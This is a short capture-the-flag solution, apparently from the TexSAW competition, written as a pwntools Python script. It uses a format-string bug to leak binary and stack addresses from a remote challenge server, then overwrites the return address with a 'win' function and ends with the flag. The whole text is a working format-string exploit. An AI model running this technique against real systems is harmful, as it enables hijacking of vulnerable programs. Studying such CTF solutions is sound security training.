# Solution
```py
from pwn import *


offset = 0x3dd8
rbp_offset = 22
binary_address_offset = 32
rbp_offset_to_substract = 0xa0
win_offset = 0x11A1

p = process(['nc', '74.207.229.59', '20221'])

# leak the return address and the win address

payload = f'%{binary_address_offset}$lx %{rbp_offset}$lx'.encode()
p.sendafter(b'twice\n', payload)

sleep(1)
res = p.clean().strip().decode()
print(res)

stack_address = int(res.split()[1], 16)
rbp_address = stack_address - rbp_offset_to_substract
return_address = rbp_address + 8

binary_base_address = int(res.split()[0], 16) - offset
print(hex(binary_base_address))
win_address = binary_base_address + win_offset

print(hex(win_address), hex(return_address))

# override the return address with win address
writes = {}
writes[return_address] = win_address

context.arch = 'amd64'
payload = fmtstr_payload(offset=6, writes=writes, write_size='short')

p.sendline(payload)

p.interactive()

p.close()

# texsaw{Pr1nt1ng_tHe_Fs_15_e4sy}
```
